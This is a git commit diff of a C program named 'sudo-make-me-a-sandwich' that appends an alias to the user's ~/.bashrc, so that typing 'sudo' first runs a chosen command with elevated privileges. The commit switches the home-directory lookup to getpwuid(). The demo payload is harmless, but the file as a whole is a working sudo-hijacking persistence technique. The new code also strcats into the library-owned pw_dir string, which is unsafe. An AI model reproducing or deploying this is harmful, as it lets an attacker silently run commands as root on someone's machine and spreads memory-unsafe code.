4b0091479c750b6c40ba1c52c5c36f4824ef4bde
skyler-ferrante <root@DESKTOP-4C24V97.localdomain>
2021-06-16 17:13:09 -0400

    Uses passwd to get home directory
    Instead of using a command to get the enviroment variable $HOME

--- sudo-make-me-a-sandwich.c
+++ sudo-make-me-a-sandwich.c
@@ -1,33 +1,15 @@
 #include<stdio.h>
-#include<stdlib.h>
 #include<string.h>
+#include<unistd.h>
+#include<pwd.h>
+#include<sys/types.h>
 
-#define MAX_PATH 255
-#define COMMAND_TO_GET_HOME "echo $HOME"
 #define SUDO_COMMAND "sudo echo hi"
 
 int main(){
-	FILE *command = popen(COMMAND_TO_GET_HOME,"r"); //Get $HOME
-	char path[MAX_PATH];
-
-	//If we could not run a command
-	if(command == NULL){
-		printf("%s did not work\n",COMMAND_TO_GET_HOME);
-		exit(1);
-	}
-
-	//Put command into path
-	fgets(path,sizeof(path),command);
-	char *pos;
-
-	//Get rid of newline
-	if ((pos=strchr(path, '\n')) != NULL){
-    		*pos = '\0';
-	}
-	else{
-		printf("Could not find newline\n");
-		exit(1);
-	}
+	//Get passwd entry, which includes the users homedirectory
+	struct passwd *passwd_entry = getpwuid(getuid());
+	char* path = passwd_entry->pw_dir;
 
 	//Add /.bashrc to path
 	strcat(path,"/.bashrc");
@@ -37,7 +19,7 @@ int main(){
 	//Open /.bashrc
 	FILE *writer = fopen(path,"a");
 
-	//Creates alias to run SUDO_COMMAND then sudo
+	//Creates alias to run SUDO_COMMAND as sudo
 	fputs("alias sudo=\'",writer);
 	fputs(SUDO_COMMAND,writer);
 	fputs("; sudo\'\n",writer);
